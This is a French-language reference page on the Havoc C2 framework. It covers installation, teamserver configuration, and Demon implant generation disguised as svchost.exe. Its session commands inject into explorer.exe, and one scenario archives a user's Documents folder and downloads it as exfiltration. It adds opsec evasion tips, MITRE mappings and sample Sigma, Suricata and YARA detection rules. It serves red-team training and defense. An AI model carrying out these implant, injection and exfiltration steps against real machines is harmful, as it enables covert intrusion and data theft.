---
title: "Outil - Havoc"
type: outil
categorie: 🕹️ C2 & Post-Exploitation
tags:
  - cyber
  - outil
  - 🕹️ C2 & Post-Exploitation
statut: publie
version: N/A (pas de release taguée ; dépôt GitHub archivé en février 2026)
licence: GPL-3.0
langage: Go, C, C++
developpeur: HavocFramework
repo: https://github.com/HavocFramework/Havoc
site: https://havocframework.com/
doc: https://havocframework.com/docs/
---

# 🕹️ Havoc — C2 & Post-Exploitation

> [!info] **En 1 phrase**
> Havoc est un framework C2 moderne, gratuit et open-source, très proche de Cobalt Strike : teamserver + client GUI, implant « Demon » entièrement en C/C++ et modules de post-exploitation.

---

## 🧾 Overview

| Champ | Valeur |
|---|---|
| Nom complet | Havoc Framework |
| Description | Framework C2 et post-exploitation : teamserver, client graphique Qt6, implant natif « Demon » |
| Catégorie | 🕹️ C2 & Post-Exploitation |
| Sous-catégorie | Command & Control (C2), post-exploitation |
| Fonction principale | Contrôler des machines compromises via des implants et des listeners |
| Type d'outil | Framework (teamserver + client GUI + implant) |
| Licence | GPL-3.0 |
| Open source / propriétaire | Open source |
| Langage(s) de programmation | Go (teamserver), C/C++ (implant Demon), C# (certains modules) |
| Développeur / organisation | HavocFramework (communauté, @C5pider) |
| Projet officiel | Havoc |
| Dépôt officiel | https://github.com/HavocFramework/Havoc |
| Documentation officielle | https://havocframework.com/docs/ |
| Date de création | 11 septembre 2022 |
| État du projet | **Archivé** : dépôt GitHub `archived` en février 2026 (dernière activité 2025-12-18) |
| Dernière version connue | Pas de release taguée (build depuis les sources) |
| Systèmes compatibles | Teamserver : Debian 10/11, Ubuntu 20.04/22.04, Kali, Windows (Docker) ; implant : Windows |

> [!note] Pour vérifier / compléter
> Le dépôt étant archivé, l'outil reste fonctionnel mais n'est plus maintenu : à valider avant intégration dans une chaîne d'outillage pérenne.

---

## 🎯 Concept

Havoc réunit un **teamserver** (backend de contrôle, Go) et un **client graphique** (GUI Qt6) pour gérer des implants appelés **Demon**, écrits en C/C++. Il est utilisé en red team pour garder le contrôle d'une machine compromise avec un implant natif Windows : pas de dépendance .NET, trafic HTTP(S)/SMB chiffré, AMSI bypass et injection de processus. Son interface moderne (sessions, logs, onglets) le rend comparable à Cobalt Strike, sans licence.

Dans le workflow d'une opération, Havoc couvre l'ensemble post-exploitation : génération de l'implant, listener HTTP(S)/SMB, sessions persistantes avec beaconing configurable (sleeptime, jitter), modules (injection de processus, capture d'écran, token manipulation, upload/download) et pivoting. Le teamserver se lance sur une machine d'infrastructure, le client s'y connecte ; l'implant est compilé dans le GUI (`Attack → Payload`).

Côté opsec, les profils `.yaotl` centralisent la configuration : ports d'écoute, identifiants du teamserver, options de log. Havoc gère les **agents SMB** (beacon secondaire sur pipes nommés) pour un pivoting silencieux. Comme tout C2, l'évasion réelle dépend de la qualité de l'implant, de la config du listener et du durcissement de la cible : validation en lab obligatoire.

```mermaid
flowchart LR
    A["Teamserver Havoc"] --> B["Client GUI"]
    B --> C["Generate Demon"]
    C -->|"HTTP / HTTPS / SMB"| D["Listener"]
    D --> E["Session Demon"]
    E --> F["Modules et injection"]
```

---

## 🧠 Concepts fondamentaux

| Concept | Explication |
|---|---|
| Teamserver | Serveur Go centralisant listeners, sessions, fichiers et logs ; expose une API REST (port 40056). |
| Client GUI | Interface Qt6 qui s'authentifie sur le teamserver avec les identifiants du profil. |
| Demon | Implant natif Windows en C/C++, sans runtime .NET : plus difficile à analyser statiquement. |
| Listener | Point d'entrée réseau du C2 (HTTP, HTTPS, SMB) qui reçoit les connexions des implants. |
| Beaconing | Cycle de communication : intervalle (`sleeptime`) + aléa (`jitter`) pour un trafic irrégulier. |
| Profil `.yaotl` | Fichier de configuration du teamserver (style YAML) : identifiants, ports, loggers. |
| Agent SMB | Beacon secondaire sur pipes nommés, sans trafic réseau direct : pivot silencieux. |
| Injection | Chargement du Demon dans un processus légitime (ex. explorer.exe) pour réduire les artefacts. |
| AMSI / ETW | Mécanismes de détection mémoire Windows ; Havoc embarque des bypass (AMSI/ETW). |

---

## 🛠️ Installation

### Debian / Ubuntu / Kali Linux

```bash
sudo apt install -y git build-essential cmake libfontconfig1-dev \
  libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
  libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
  libsqlite3-dev libbz2-dev mesa-common-dev libgl1-mesa-glx libegl1-mesa-dev
```

### Compilation depuis les sources

```bash
git clone --recursive https://github.com/HavocFramework/Havoc.git && cd Havoc
make ts-build
make client-build
./havoc server --profile ./profiles/havoc.yaotl -v
./havoc client
```

### Docker

```bash
cd Havoc/Docker && docker compose up -d
```

> [!warning] ⚠️ Prérequis & problèmes potentiels
> - Compilation longue et gourmande en mémoire : prévoir ≥ 4 Go de RAM et les paquets Qt6.
> - Installation documentée pour Debian 10/11, Ubuntu 20.04/22.04, Kali ; autres distros à adapter (`libncurses5-dev` peut manquer → utiliser `libncurses-dev`).
> - Dépôt archivé depuis février 2026 : plus de correctifs ni mises à jour à attendre.

---

## ⚙️ Configuration

La configuration principale se fait dans le **profil teamserver** (`.yaotl`, ex. `profiles/havoc.yaotl`).

| Paramètre | Rôle | Valeur possible | Impact | Exemple |
|---|---|---|---|---|
| `Teamserver.Host` | Interface d'écoute | `0.0.0.0`, IP | Expose ou restreint l'accès | `0.0.0.0` |
| `Teamserver.Port` | Port du teamserver | 40056 par défaut | Port du contrôle/API | `40056` |
| `Teamserver.Users` | Comptes du client | `admin / mot de passe` | Accès au GUI | `admin / SuperSecret!` |
| `Teamserver.Hostname` | Nom d'hôte affiché | chaîne | Certificats / apparence | `c2.example.com` |
| `Listener.Host` | IP de callback des implants | IP ou domaine | Doit être joignable par les cibles | `10.10.14.5` |
| `Listener.Interval` | Sleeptime du beacon | millisecondes | Régularité du trafic | `5000` |
| `Listener.Jitter` | Aléa de beaconing | pourcentage | Discrétion du trafic | `30` |
| `Implant.Name` | Nom de l'artefact | chaîne | Apparence du binaire | `svchost.exe` |

> [!tip] Le host/port de chaque listener se règle dans le GUI (`View > Listeners`), en plus du profil teamserver.

---

## 🏗️ Architecture interne

Au lancement, le teamserver charge le profil `.yaotl`, initialise opérateurs, listeners et sessions, puis ouvre l'API REST sur le port `40056`. Le client GUI s'authentifie et reçoit les événements en temps réel (nouvelle session, sortie de commande, logs).

L'implant **Demon** est compilé séparément : le GUI appelle les compilateurs (x86_64-w64-mingw32-gcc ou enveloppe `-c`) pour produire un EXE, une DLL ou du shellcode. Sur la cible, l'implant établit son beacon vers le listener (HTTP, HTTPS, SMB), applique sleep/jitter et attend les commandes. Chaque session a un **handler** dans le GUI ; les modules (inject, screenshot, token, exécution) s'exécutent dans des threads séparés et remontent leurs résultats dans la console.

Transport : du JSON sur canaux HTTP/SMB ; les profils permettent de customiser les chemins d'URL et le User-Agent. L'agent SMB circule sur des pipes nommés : une machine interne peut être contrôlée via la session d'une machine externe, sans nouveau flux sortant.

---

## ⌨️ Commandes

### Commandes principales

```bash
./havoc server --profile ./profiles/havoc.yaotl -v   # démarre le teamserver
./havoc client                                        # lance le client GUI
```

Havoc étant piloté par le GUI, les « commandes » sont des actions de l'interface ou des commandes de console de session.

| Commande / Action | Objectif | Résultat attendu |
|---|---|---|
| `./havoc server --profile <f>.yaotl -v` | Démarre le teamserver | Écoute sur le port du profil |
| `./havoc client` | Lance le client | Connexion puis dashboard |
| `View > Listeners` | Gérer les listeners | Création/suppression HTTP, HTTPS, SMB |
| `Attack > Payload` | Générer un implant | Compilation EXE/DLL/shellcode Demon |
| `Attack > Modules` | Exécuter des modules | Post-exploitation sur la session active |
| `shell <cmd>` | Commande shell | Sortie dans la console |
| `exec <binaire>` | Exécuter un binaire | Sortie capturée |
| `inject <pid>` | Injecter le Demon dans un processus | Session migrée |
| `upload` / `download` | Transferts de fichiers | Fichier déplacé |
| `screenshot` | Capture d'écran | Image dans les logs |
| `exit` | Terminer la session | Session supprimée |

### Commandes avancées

```bash
# Interroger l'API REST du teamserver (selon version)
curl -s -X POST http://localhost:40056/agent/listeners
```

> [!note] À vérifier
> Les endpoints de l'API REST varient selon les versions : valider sur la version compilée avant automatisation.

---

## 🎚️ Options et flags

| Option | Description | Exemple | Niveau |
|---|---|---|---|
| `server --profile <f>` | Charge un profil teamserver `.yaotl` | `./havoc server --profile havoc.yaotl` | Basic |
| `server -v` | Mode verbeux | `./havoc server -v` | Basic |
| `client` | Lance le client GUI | `./havoc client` | Basic |
| Sleeptime | Intervalle de callback (ms) | `5000` dans le payload | Intermediate |
| Jitter | Aléa sur l'intervalle (%) | `30` dans le payload | Intermediate |
| Arch de l'implant | Architecture cible | `x64` / `x86` | Intermediate |
| Type de sortie | Format de l'implant | `EXE` / `DLL` / `shellcode` | Advanced |
| `inject <pid>` | Injection de processus | `inject 3824` | Advanced |
| Listener SMB | Beacon via pipes nommés | `View > Listeners > Add SMB` | Expert |
| `-c` / compilateur local | Cross-compilation wine/mingw | option de build | Expert |

> [!tip] Options les plus utiles au quotidien
> `--profile` (teamserver), sleep + jitter (opsec), `inject <pid>` (furtivité), `shellcode` comme format quand l'EXE sur disque est trop risqué.

---

## 🧪 Exemples pratiques

### Beginner

```bash
# Objectif : environnement minimal (teamserver + client + listener)
./havoc server --profile ./profiles/havoc.yaotl -v
# autre terminal
./havoc client
# View > Listeners > Add HTTP > host 10.10.14.5, port 80 > Save
```

Résultat attendu : un listener HTTP actif, prêt à recevoir des implants.

### Intermediate

```bash
# Objectif : générer et lancer un premier implant
# Attack > Payload > Windows Exe > x64 > listener HTTP
# Nom : svchost.exe, Sleep 5000 ms, Jitter 20% > Generate
# Exécuter le binaire sur la cible Windows
```

Résultat attendu : la session apparaît dans `Sessions` ; `whoami` répond dans la console.

### Advanced

```bash
# Objectif : post-exploitation orientée opsec
shell whoami /priv
exec C:\Windows\System32\whoami.exe
screenshot
inject 3824          # migrer le Demon dans explorer.exe
```

### Expert

```bash
# Objectif : chaîner deux machines via un listener SMB (pivot sans flux sortant)
# Machine A (externe) : session HTTP active
# View > Listeners > Add SMB listener > générer un implant SMB pour B (interne)
# La session B transite par A via le pipe nommé, sans nouvelle connexion sortante
```

---

## 🧪 Workflow complet (scénario pas à pas)

1. **Démarrer le teamserver** : `./havoc server --profile ./profiles/havoc.yaotl -v` (contrôle sur le port `40056`).
2. **Démarrer le client** : `./havoc client` → connexion avec les identifiants du profil.
3. **Créer un listener** : `View > Listeners` → `Add` → `HTTP` ou `HTTPS`, host + port (ex. `10.10.14.5:80`).
4. **Générer l'implant** : `Attack > Payload` → `Windows Exe`, arch `x64`, listener choisi, nom du démon, sleep 5 s + jitter 20 %.
5. **Livrer et exécuter** l'implant sur la cible ; récupérer la session dans `Sessions`.
6. **Post-exploitation** :
   ```bash
   shell whoami /priv
   exec C:\Windows\System32\whoami.exe
   upload ./payload2.exe C:\Windows\Temp\
   download C:\Users\admin\Desktop\flag.txt
   screenshot
   ```
7. **Nettoyer** : terminer la session (`exit`), supprimer les artefacts, revoir le beaconing pour la furtivité.

---

## 🎬 Scénarios avancés

### Scénario 1 : injecter le Demon dans un processus légitime

```bash
shell tasklist | findstr explorer
inject 3824
# La session migre dans explorer.exe : pas de nouveau binaire exécuté
```

### Scénario 2 : beaconing furtif + exfiltration

```bash
# Sleep 3000 ms + jitter 30% pour un trafic irrégulier
shell cmd /c "powershell Compress-Archive -Path C:\Users\admin\Documents\* -DestinationPath C:\Temp\docs.zip"
download C:\Temp\docs.zip
```

### Scénario 3 : pivoting SMB entre deux sessions

```bash
# Session A (externe) active → View > Listeners > Add SMB listener
# Implant SMB livré sur B (interne) : le trafic passe par le pipe, sans flux sortant
# Commandes : A (HTTP) -> A (SMB) -> B
```

---

## 🛡️ Cybersecurity use cases

| Phase | Utilisation |
|---|---|
| Reconnaissance | Pas d'usage direct (outil post-exploitation) |
| Enuméération | Depuis une session : `shell whoami /priv`, `shell netstat -ano` |
| Exploitation | Livraison de l'implant Demon après compromission initiale |
| Post-exploitation | Cœur du rôle : shell, injection, tokens, captures, transferts, pivoting |
| Exfiltration | `download`, `screenshot`, archivage via le canal C2 |
| Persistance | Via commandes shell (services, scheduled tasks) |
| Reporting | Logs et captures centralisés (onglet Logs) |

---

## 🎯 MITRE ATT&CK

| Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
|---|---|---|---|---|---|
| Execution | Process Injection | T1055 | Module `inject` dans des processus légitimes | EDR mémoire, Sysmon EID 8 | EDR, moindre privilège |
| Execution | User Execution: Malicious File | T1204.002 | Exécution de l'implant par l'utilisateur | Contrôle des téléchargements | Sensibilisation, sandbox |
| Defense Evasion | Obfuscated Files or Information | T1027 | Options d'obfuscation de l'implant | Analyse statique, YARA | AV/EDR statique |
| Defense Evasion | Impair Defenses (AMSI) | T1562.001 | Bypass AMSI/ETW embarqués | Monitoring AMSI, ETW | EDR mémoire, durcissement |
| Defense Evasion | Signed Binary Proxy Execution | T1218 | Livraison via rundll32 (DLL) | Logs 4688, Sysmon | Application Control |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Beaconing HTTP/HTTPS | Analyse des flux HTTP | Filtrage egress |
| Command and Control | Protocol Tunneling | T1572 | Agent SMB via pipes nommés | Sysmon EID 17/18 | Surveillance des pipes |
| Discovery | System Information Discovery | T1082 | Énumération depuis la session | Logs d'exécution | Limiter les privilèges |
| Collection | Screen Capture | T1113 | Module `screenshot` | Comportemental EDR | EDR |
| Lateral Movement | Remote Services | T1021.001 | Déploiement d'agents SMB | Logs 4624, flux SMB | Segmentation réseau |

> [!note] Ne renseigner que si l'association est réellement pertinente.
> Havoc n'a pas d'identifiant logiciel (SID) dans ATT&CK : il est traité par technique, comme Cobalt Strike.

---

## 🛡️ Defensive Security

### Signes observables

| Indicateur | Détail |
|---|---|
| Binaire Go/C++ non signé, petit, sans manifeste | Implant Demon : analyser strings et imports |
| Allocations mémoire RWX, injections de threads | EDR comportemental, surveillance des allocations |
| HTTP(S) sortant régulier vers une IP/domaine C2 | Corréler volume, User-Agent, régularité (beaconing) |
| Bypass AMSI/ETW observés | Logging ETW, blobs mémoire modifiés |
| Port 40056 exposé sur l'infra | Restreindre au localhost, ne jamais exposer |
| Beacons SMB sur pipes nommés | Sysmon EID 17/18, trafic IPC |

### Règles de détection (Sigma / Suricata / Snort / YARA)

```yaml
# Exemple Sigma — injection de processus type C2 (à adapter)
title: Potential Process Injection (Havoc-like)
status: experimental
description: Allocations RWX et CreateRemoteThread fréquents (à adapter)
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\explorer.exe'
  condition: selection
level: high
```

```bash
# Exemple Suricata — beaconing HTTP régulier (à adapter)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Potential C2 HTTP beaconing"; flow:established,to_server; content:"GET"; http_method; threshold:type both, track by_src, seconds 3600, count 30; sid:1000001; rev:1;)
```

```yaml
# Exemple YARA — strings caractéristiques d'un artefact Havoc (à adapter)
rule Havoc_Demon_example {
  meta:
    description = "Exemple d'empreinte YARA sur artefacts Havoc"
  strings:
    $a = "Havoc" ascii
    $b = "Demon" ascii
  condition:
    uint16(0) == 0x5A4D and any of them
}
```

---

## 🤖 Automatisation

L'API REST du teamserver (port `40056`) permet d'automatiser une partie de la gestion ; en pratique, la majorité des automatisations passent par le client et des wrappers de build.

```bash
# Vérifier que le teamserver répond
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:40056/

# Générer un implant par hôte (conceptuel)
for i in 01 02 03; do echo "Compile implant-$i"; done
```

```python
# Exemple conceptuel de pilotage via l'API (selon version)
import requests
# r = requests.post("http://localhost:40056/agent/...", json={...})
```

---

## 📤 Output et parsing

Sorties principales : logs du teamserver (stdout, mode `-v`) et résultats de commandes dans la console GUI. Captures et fichiers téléchargés sont stockés dans le répertoire de logs.

```bash
./havoc server --profile havoc.yaotl -v 2>&1 | tee /var/log/havoc.log
grep -i "session" /var/log/havoc.log
```

```python
# Exemple : lister les sessions depuis un log (conceptuel)
# import re
# matches = re.findall(r"session.*user (\w+)", open("/var/log/havoc.log").read())
```

---

## 🔗 Intégrations

Havoc s'intègre aux outils de livraison, de post-exploitation et de reporting.

```text
Compromission initiale → Havoc (listener + Demon) → shell/inject → exfil → rapport
```

- [[Tools|🧰 Outils]]
- [[Techniques/Pivoting et Tunneling|🌉 Pivoting et Tunneling]]
- [[Techniques/Privilege Escalation Windows|⬆️ PrivEsc Windows]]
- [[Techniques/DLL Hijacking|📦 DLL Hijacking]]
- [[Outil - Metasploit|🎯 Metasploit]]
- [[Outil - Nmap|🕵️ Nmap]]
- [[Outil - Sliver|🐺 Sliver]]
- [[Outil - Covenant|🐉 Covenant]]
- [[Outil - Chisel|🧵 Chisel]]

---

## 🔄 Alternatives

| Outil | Avantages | Inconvénients | Cas d'usage |
|---|---|---|---|
| Cobalt Strike | Mature, écosystème énorme, Aggressor Scripts | Payant, très profilé | Red team d'entreprise |
| Sliver | Open source, Go, implant cross-platform, actif | CLI, moins de modules intégrés | Engagement long |
| Covenant | Open source, .NET/C#, GUI | Pas de release officielle | Post-exploitation Windows |
| Mythic | Open source, web, modulaire (Apollo Go) | Lourd (Docker) | Opérations longues |
| Metasploit | Base d'exploits énorme, mature | Très détecté | Exploitation, formation |

> **Quand utiliser Havoc plutôt qu'un autre ?** Quand on veut une alternative C2 gratuite de type Cobalt Strike avec implant natif C/C++ et GUI confortable — à condition d'accepter un projet archivé. Pour un support actif, Sliver ou Mythic sont plus pérennes.

---

## ⚡ Performance

- Build du teamserver/client long et gourmand en RAM ; génération d'un implant = compilation à la volée (mingw).
- Implant léger en mémoire (natif sans runtime) ; CPU dépend du module (screenshot, compression).
- Beacon HTTP consomme peu ; canal SMB réduit encore le trafic sortant.
- Pas de benchmark officiel ; prévoir ≥ 2-4 Go de RAM pour le teamserver.

---

## 🛠️ Troubleshooting

### Common problems

#### Problème : le client ne se connecte pas au teamserver

- **Cause** : mauvais identifiants du profil, ou teamserver pas prêt.
- **Solution** : vérifier `Users` du `.yaotl`, relancer `./havoc server -v`.
- **Vérification** : `curl http://localhost:40056/` répond.

#### Problème : l'implant ne remonte pas de session

- **Cause** : IP/port du listener non joignable, firewall egress.
- **Solution** : écouter sur `0.0.0.0`, tester la connectivité depuis la cible.
- **Vérification** : listener actif + trafic visible en `-v`.

#### Problème : `inject` crashe la cible

- **Cause** : PID inexact ou droits insuffisants.
- **Solution** : récupérer le PID via `tasklist`, viser un processus système, vérifier `whoami /priv`.
- **Vérification** : la session reste active après `inject` (test en lab).

#### Problème : erreurs de compilation

- **Cause** : dépendances Qt6 incomplètes ou distro non supportée.
- **Solution** : installer les paquets listés, utiliser Debian/Ubuntu documenté.
- **Vérification** : `make ts-build` se termine sans erreur.

---

## 🔐 Sécurité de l'outil

- **Ne pas exposer le teamserver** : le port `40056` en accès public compromet toutes les sessions ; le restreindre au localhost ou derrière un tunnel authentifié.
- **Identifiants du profil** : crédentials `Users` forts et uniques par engagement.
- **Signature** : l'implant n'est pas signé par défaut (AppLocker, WDAC, SmartScreen bloquent) ; prévoir une signature pour les tests autorisés.
- **Logs sensibles** : captures, fichiers et commandes stockés en clair : chiffrer le disque de l'infrastructure.
- **Projet archivé** : plus de correctifs de sécurité publiés ; vulnérabilités futures non adressées.
- **Usage légal** : uniquement dans le cadre d'engagements autorisés.

---

## ⚠️ Limitations

- Dépôt archivé (février 2026) : plus de maintenance ni de correctifs.
- Implant **Windows uniquement** : pas d'agent natif Linux/macOS.
- Pas de release taguée : version non versionnée, builds à valider.
- Évasion relative : mieux que PowerShell, mais détectable par des EDR récents selon la config.
- Bibliothèque de modules plus réduite que Cobalt Strike ou Empire.
- Support documenté limité (Debian 10/11, Ubuntu 20.04/22.04).

---

## 📋 Cheatsheet

```bash
# Dépendances
sudo apt install -y git build-essential cmake libfontconfig1-dev libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev libgl1-mesa-glx libegl1-mesa-dev
# Build
git clone --recursive https://github.com/HavocFramework/Havoc.git && cd Havoc
make ts-build && make client-build
# Démarrage
./havoc server --profile ./profiles/havoc.yaotl -v
./havoc client
# API (si activée)
curl -s -X POST http://localhost:40056/agent/listeners
# GUI : View > Listeners > Add ; Attack > Payload > Generate ; Session > console
# console : shell, exec, upload, download, screenshot, inject <pid>, exit
```

---

## ⚡ Quick reference

| | |
|---|---|
| **À quoi sert-il ?** | C2 + post-exploitation type Cobalt Strike (teamserver + GUI + implant Demon) |
| **Quand l'utiliser ?** | Après compromission initiale, pour contrôler des machines Windows et pivoter |
| **Commande principale** | `./havoc server --profile havoc.yaotl -v` puis `./havoc client` |
| **Alternative principale** | Sliver (open source, actif) ou Cobalt Strike (commercial) |
| **Concepts importants** | Teamserver, Demon, listener HTTP/SMB, beaconing, injection, profil `.yaotl` |
| **Liens associés** | [[Outil - Sliver\|🐺 Sliver]] · [[Outil - Covenant\|🐉 Covenant]] · [[Outil - Mythic\|🕸️ Mythic]] |

---

## 🔍 Détection & Défense

| Signe | Défense |
|---|---|
| Allocations mémoire RWX et injections de threads | EDR comportemental, surveillance des allocations mémoire |
| HTTP(S) sortant régulier vers IP de l'attaquant | Filtrage egress, proxy authentifié, blocage des User-Agents inconnus |
| Bypass AMSI/ETW observés | Activer le logging ETW, surveiller les blobs mémoire modifiés |
| Port 40056 exposé | Ne jamais exposer le teamserver publiquement : accès restreint au localhost |
| Binaires non signés exécutés | Corréler processus + DNS + logs réseau (réponse SOC) |
| Beacons SMB sur pipes nommés (`\\.\pipe\...`) | Surveiller les pipes nommés et le trafic IPC (Sysmon EID 17/18) |

---

## ⚠️ Tips & Pièges

> [!tip] 💡 **Tips**
> - Configurez sleep et jitter (ex. `sleeptime 5000`, `jitter 30 %`) : un trafic parfaitement régulier est un signal fort.
> - Favorisez l'injection (`inject`) dans un processus système légitime pour réduire la détection statique.
> - HTTPS avec certificat valide sur un domaine d'apparence légitime = trafic plus réaliste.
> - Multi-hôtes : un implant par machine (nom, sleep, jitter différents) pour éviter la corrélation.
> - Validez chaque implant sur une VM Windows à jour avant l'engagement.

> [!warning] ⚠️ **Pièges**
> - Projet jeune et **archivé** : certaines features (SMB, modules) peuvent être buggées. Testez en lab.
> - N'utilisez pas la cross-compilation (`-c`) sans configurer correctement wine/mingw.
> - Un port `40056` exposé compromet l'opération.
> - Ne confondez pas l'IP du listener (vue par la cible) avec `localhost` du teamserver.

---

## 📚 References

### Official

- Documentation officielle : https://havocframework.com/docs/
- Site officiel : https://havocframework.com/
- GitHub officiel : https://github.com/HavocFramework/Havoc
- Installation Docker : https://github.com/HavocFramework/Havoc/tree/main/Docker

### Security references

- MITRE ATT&CK — Command and Control : https://attack.mitre.org/tactics/TA0011/
- MITRE ATT&CK — Process Injection : https://attack.mitre.org/techniques/T1055/

### Community

- HackTricks — Red Team méthodologie : https://book.hacktricks.xyz/redteam/pentesting-methodology
- Articles « Havoc C2 Demon analysis » (rechercher les analyses récentes)

---

➡️ **Liens :** [[Tools|🧰 Outils]] · [[Techniques/Pivoting et Tunneling|🌉 Pivoting]] · [[Techniques/Privilege Escalation Windows|⬆️ PrivEsc Windows]] · [[Techniques/DLL Hijacking|📦 DLL Hijacking]]
